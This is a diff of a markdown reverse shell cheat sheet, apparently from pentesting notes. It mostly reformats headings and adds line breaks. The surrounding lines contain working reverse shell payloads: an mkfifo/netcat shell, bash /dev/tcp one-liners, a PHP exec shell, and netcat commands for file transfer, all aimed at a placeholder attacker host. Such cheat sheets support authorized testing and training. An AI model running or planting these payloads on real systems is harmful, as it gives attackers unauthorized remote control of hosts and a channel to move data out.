@@ -5,15 +5,20 @@
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker_ip attacker_port >/tmp/f
 ```
 
-## Bash (in file)
+<br>
+
+## Bash 
+### Bash (in file)
 ```
  #!/bin/bash
 bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
 ```
-## Bash (command)
+### Bash (command)
 ``` 
 /bin/bash -c "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1"
 ``` 
+
+<br>
 
 ## Nc 
 ```
@@ -23,11 +28,15 @@ nc addr port  (connect to port)
 nc -lvnp <port> > file (RECEIVE)
 nc <to_IP> <to_port> < file (SEND)
 ```
+<br>
+
 
 ## PHP simple shell
 ```
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_attack/port_attack 0>&1'"); ?>
 ```
+
+<br>
 
 # Stabilizing shell
 
